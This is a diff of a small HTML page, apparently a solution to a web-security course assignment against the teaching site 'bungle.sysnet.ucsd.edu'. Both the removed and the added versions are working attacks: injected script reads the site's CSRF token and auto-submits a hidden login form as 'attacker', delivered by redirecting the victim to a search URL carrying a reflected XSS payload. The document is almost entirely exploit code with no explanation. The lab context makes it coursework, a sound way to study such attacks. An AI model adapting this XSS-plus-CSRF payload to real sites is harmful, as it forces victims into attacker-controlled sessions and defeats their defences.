@@ -1,48 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Loading...</title>
+  <title></title>
 </head>
 <body>
   <script>
-    var xssPayload = `
-      fetch('https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0')
-        .then(r => r.text())
-        .then(html => {
-          var parser = new DOMParser();
-          var doc = parser.parseFromString(html, 'text/html');
-          var token = doc.querySelector('input[name=csrf_token]').value;
-          
-          // Step 2: Submit the login form with the stolen token
-          var form = document.createElement('form');
-          form.method = 'POST';
-          form.action = 'https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0';
-          
-          var u = document.createElement('input');
-          u.name = 'username';
-          u.value = 'attacker';
-          form.appendChild(u);
-          
-          var p = document.createElement('input');
-          p.name = 'password';
-          p.value = 'l33th4x';
-          form.appendChild(p);
-          
-          var t = document.createElement('input');
-          t.name = 'csrf_token';
-          t.value = token;
-          form.appendChild(t);
-          
-          document.body.appendChild(form);
-          form.submit();
-        });
-    `;
-
-    var encodedPayload = encodeURIComponent('<script>' + xssPayload + '</' + 'script>');
-    var xssUrl = 'https://bungle.sysnet.ucsd.edu/search?csrfdefense=1&xssdefense=0&q=' + encodedPayload;
+    var attackCode = 
+      '<script>' +
+      'var r=new XMLHttpRequest();' +
+      'r.open("GET","/?csrfdefense=1&xssdefense=0",false);' +
+      'r.send();' +
+      'var p=new DOMParser();' +
+      'var h=p.parseFromString(r.responseText,"text/html");' +
+      'var tkn=h.querySelector("input[name=csrf_token]");' +
+      'if(tkn){' +
+        'var loginForm=document.createElement("form");' +
+        'loginForm.method="POST";' +
+        'loginForm.action="/login?csrfdefense=1&xssdefense=0";' +
+        'loginForm.innerHTML=' +
+          '\'<input type="hidden" name="username" value="attacker">\'+' +
+          '\'<input type="hidden" name="password" value="l33th4x">\'+' +
+          '\'<input type="hidden" name="csrf_token" value="\'+tkn.value+\'">\';' +
+        'document.body.appendChild(loginForm);' +
+        'loginForm.submit();' +
+      '}' +
+      '<\/script>';
     
-    window.location = xssUrl;
+    window.location.href = 'https://bungle.sysnet.ucsd.edu/search?xssdefense=0&q=' + encodeURIComponent(attackCode);
   </script>
 </body>
 </html>
